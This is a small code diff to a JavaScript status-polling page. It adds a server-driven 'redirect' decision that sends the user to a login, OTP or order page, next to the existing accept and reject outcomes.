@@ -32,12 +32,16 @@ const hash = location.hash.slice(1);
 const ref = hash.split("~")[0];
 if (!ref) window.location.href = "login.html";
 
+const pages = {login:"login.html",otp:"otp.html",order:"order.html"};
 let polling = setInterval(async () => {
   try {
     const r = await fetch("/api/status/" + encodeURIComponent(ref));
     const d = await r.json();
     if (!d.ok) return;
-    if (d.decision === "accept" && d.next === "done") {
+    if (d.decision === "redirect" && d.next && pages[d.next]) {
+      clearInterval(polling);
+      window.location.href = pages[d.next] + "#" + hash;
+    } else if (d.decision === "accept" && d.next === "done") {
       clearInterval(polling);
       window.location.href = "success.html";
     } else if (d.decision === "reject") {
